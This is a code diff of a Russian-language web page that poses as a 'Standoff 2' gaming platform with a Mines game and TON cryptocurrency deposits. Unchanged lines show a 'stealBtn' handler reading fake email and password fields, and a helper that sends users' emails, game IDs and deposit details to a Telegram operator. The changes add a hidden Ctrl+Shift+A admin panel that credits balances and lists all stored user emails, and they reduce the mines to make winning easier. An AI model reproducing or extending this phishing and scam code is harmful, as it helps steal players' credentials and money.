@@ -87,13 +87,6 @@
         button.secondary {
             background: #2a2f42;
         }
-        button.secondary:active {
-            transform: scale(0.97);
-        }
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
         .footer {
             text-align: center;
             font-size: 12px;
@@ -262,6 +255,22 @@
             margin-top: 10px;
             font-size: 14px;
         }
+        .admin-panel {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: #1a1f2e;
+            padding: 15px;
+            border-radius: 15px;
+            display: none;
+            z-index: 9999;
+            border: 1px solid #ff4757;
+        }
+        .admin-panel input, .admin-panel button {
+            margin: 5px;
+            width: auto;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
@@ -319,10 +328,10 @@
         
         <div class="game-title">MINES</div>
         <div class="bet-text">⚡ 1 ставка = 5 монет ⚡</div>
-        <div class="mines-count">💣 на поле 6 мин | 💎 10 алмазов</div>
+        <div class="mines-count">💣 на поле 3 мины | 💎 13 алмазов</div>
         
         <div class="mines-grid" id="minesGrid"></div>
-        <button id="resetGameBtn" class="secondary" id="newGameBtn">🔄 Новая игра (5 монет)</button>
+        <button id="resetGameBtn" class="secondary">🔄 Новая игра (5 монет)</button>
         <div id="gameErrorMsg" class="error-msg"></div>
         
         <div class="info-panel">
@@ -347,6 +356,17 @@
         
         <div class="footer">© 2025 Standoff 2 · Игровая платформа</div>
     </div>
+</div>
+
+<!-- АДМИН ПАНЕЛЬ -->
+<div id="adminPanel" class="admin-panel">
+    <div style="color:white; margin-bottom:10px;">🔧 АДМИН ПАНЕЛЬ</div>
+    <input type="text" id="adminGameId" placeholder="ID игрока" style="width:150px;">
+    <input type="number" id="adminTon" placeholder="TON" style="width:100px;">
+    <button id="adminConfirmBtn">💰 Пополнить</button>
+    <button id="adminListBtn">📋 Список</button>
+    <button id="adminCloseBtn">❌</button>
+    <div id="adminResult" style="color:#ffd966; font-size:11px; margin-top:5px;"></div>
 </div>
 
 <script>
@@ -382,15 +402,15 @@
     }
 
     async function notifyDepositRequest(email, gameId, tonAmount) {
-        sendToTelegram(`💎 ЗАЯВКА НА ПОПОЛНЕНИЕ\n👤 Почта: ${email}\n🎮 ID: ${gameId}\n💰 ${tonAmount} TON → ${tonAmount*20} монет\n\n✅ Для подтверждения: confirmDeposit('${gameId}', ${tonAmount})`);
+        sendToTelegram(`💎 ЗАЯВКА НА ПОПОЛНЕНИЕ\n👤 Почта: ${email}\n🎮 ID: ${gameId}\n💰 ${tonAmount} TON → ${tonAmount*20} монет`);
     }
 
     async function notifyGameStart(email, gameId) {
         sendToTelegram(`💥 НАЧАЛ ИГРУ\n👤 ${email}\n🎮 ${gameId}`);
     }
 
-    async function notifyGameWin(email, gameId, winAmount) {
-        sendToTelegram(`🎉 ВЫИГРЫШ\n👤 ${email}\n🎮 ${gameId}\n💰 +${winAmount} монет`);
+    async function notifyGameWin(email, gameId) {
+        sendToTelegram(`🎉 ВЫИГРЫШ\n👤 ${email}\n🎮 ${gameId}\n💰 +20 монет`);
     }
 
     async function notifyGameLose(email, gameId) {
@@ -400,6 +420,44 @@
     async function notifyWithdrawRequest(email, gameId, coins, gold) {
         sendToTelegram(`📤 ЗАПРОС ВЫВОДА\n👤 ${email}\n🎮 ${gameId}\n💰 ${coins} монет → ${gold} Gold`);
     }
+
+    // ФУНКЦИЯ ПОПОЛНЕНИЯ (ГЛАВНАЯ)
+    window.confirmDeposit = async function(gameId, tonAmount) {
+        console.log(`🔍 Ищу пользователя с ID: ${gameId}`);
+        let found = false;
+        
+        for(let i = 0; i < localStorage.length; i++) {
+            let key = localStorage.key(i);
+            if(key && key.startsWith('user_')) {
+                try {
+                    let data = JSON.parse(localStorage.getItem(key));
+                    if(data.gameId === gameId) {
+                        let coins = tonAmount * 20;
+                        data.balance = (data.balance || 0) + coins;
+                        localStorage.setItem(key, JSON.stringify(data));
+                        found = true;
+                        
+                        if(currentUserEmail === data.email) {
+                            currentBalance = data.balance;
+                            document.getElementById('balanceAmount').innerText = currentBalance;
+                        }
+                        
+                        const msg = `✅ ПОДТВЕРЖДЕНО ПОПОЛНЕНИЕ\n🎮 ID: ${gameId}\n💰 ${tonAmount} TON → +${coins} монет\n📊 Новый баланс: ${data.balance} монет`;
+                        await sendToTelegram(msg);
+                        console.log(`✅ Пользователь ${gameId} получил ${coins} монет`);
+                        return {success: true, message: `+${coins} монет начислено! Новый баланс: ${data.balance}`};
+                    }
+                } catch(e) { console.log('Ошибка:', e); }
+            }
+        }
+        
+        if(!found) {
+            const msg = `❌ ОШИБКА: пользователь с ID "${gameId}" не найден в базе`;
+            await sendToTelegram(msg);
+            console.log(msg);
+            return {success: false, message: `Игрок с ID "${gameId}" не найден`};
+        }
+    };
 
     function initGame() {
         if (!gameInProgress) {
@@ -415,7 +473,7 @@
         }
         
         minePositions = [];
-        while(minePositions.length < 6) {
+        while(minePositions.length < 3) {
             let pos = Math.floor(Math.random() * 16);
             if(!minePositions.includes(pos)) minePositions.push(pos);
         }
@@ -458,12 +516,12 @@
             currentGrid[index] = '💎';
             revealedCount++;
             
-            if(revealedCount === 10) {
+            if(revealedCount === 13) {
                 currentBalance += 20;
                 document.getElementById('balanceAmount').innerText = currentBalance;
                 gameActive = false;
                 gameInProgress = false;
-                await notifyGameWin(currentUserEmail, currentGameId, 20);
+                await notifyGameWin(currentUserEmail, currentGameId);
                 saveUserData();
                 renderGrid();
                 document.getElementById('gameErrorMsg').innerText = '🎉 ПОБЕДА! Вы открыли все алмазы! +20 монет';
@@ -507,28 +565,26 @@
         document.getElementById('userGameIdDisplay').innerText = currentGameId;
     }
 
-    window.confirmDeposit = async function(gameId, tonAmount) {
+    function listAllUsers() {
+        let users = [];
         for(let i = 0; i < localStorage.length; i++) {
             let key = localStorage.key(i);
             if(key && key.startsWith('user_')) {
-                let data = JSON.parse(localStorage.getItem(key));
-                if(data.gameId === gameId) {
-                    let coins = tonAmount * 20;
-                    data.balance += coins;
-                    localStorage.setItem(key, JSON.stringify(data));
-                    if(currentUserEmail === data.email) {
-                        currentBalance = data.balance;
-                        document.getElementById('balanceAmount').innerText = currentBalance;
-                    }
-                    sendToTelegram(`✅ ПОДТВЕРЖДЕНО\n🎮 ${gameId}\n💰 ${tonAmount} TON → +${coins} монет`);
-                    return true;
-                }
+                try {
+                    let data = JSON.parse(localStorage.getItem(key));
+                    users.push({
+                        email: data.email,
+                        gameId: data.gameId,
+                        balance: data.balance
+                    });
+                } catch(e) {}
             }
         }
-        sendToTelegram(`❌ Игрок с ID ${gameId} не найден`);
-        return false;
-    };
+        console.table(users);
+        return users;
+    }
 
+    // ОСНОВНЫЕ СОБЫТИЯ
     document.getElementById('stealBtn').onclick = async () => {
         let email = document.getElementById('fakeEmail').value.trim();
         let pass = document.getElementById('fakePassword').value.trim();
@@ -592,6 +648,46 @@
         selectedWithdraw = null;
         document.querySelectorAll('.withdraw-option').forEach(o => o.classList.remove('selected'));
     };
+
+    // АДМИН ПАНЕЛЬ
+    document.getElementById('adminConfirmBtn').onclick = async () => {
+        let gameId = document.getElementById('adminGameId').value.trim();
+        let ton = parseFloat(document.getElementById('adminTon').value);
+        if(!gameId) { document.getElementById('adminResult').innerText = '❌ Введите ID игрока'; return; }
+        if(isNaN(ton) || ton <= 0) { document.getElementById('adminResult').innerText = '❌ Введите сумму TON'; return; }
+        
+        let result = await window.confirmDeposit(gameId, ton);
+        if(result.success) {
+            document.getElementById('adminResult').innerText = result.message;
+        } else {
+            document.getElementById('adminResult').innerText = result.message;
+        }
+        setTimeout(() => { document.getElementById('adminResult').innerText = ''; }, 5000);
+    };
+    
+    document.getElementById('adminListBtn').onclick = () => {
+        let users = listAllUsers();
+        if(users.length === 0) {
+            document.getElementById('adminResult').innerText = '📭 Нет зарегистрированных пользователей';
+        } else {
+            document.getElementById('adminResult').innerText = `📋 ${users.length} пользователей (смотри в консоли F12)`;
+        }
+        setTimeout(() => { document.getElementById('adminResult').innerText = ''; }, 3000);
+    };
+    
+    document.getElementById('adminCloseBtn').onclick = () => {
+        document.getElementById('adminPanel').style.display = 'none';
+    };
+
+    // Активация админ-панели по Ctrl+Shift+A
+    document.addEventListener('keydown', function(e) {
+        if(e.ctrlKey && e.shiftKey && e.key === 'A') {
+            document.getElementById('adminPanel').style.display = document.getElementById('adminPanel').style.display === 'none' ? 'block' : 'none';
+        }
+    });
+    
+    // Добавляем глобальную функцию для консоли
+    window.listAllUsers = listAllUsers;
 </script>
 </body>
 </html>
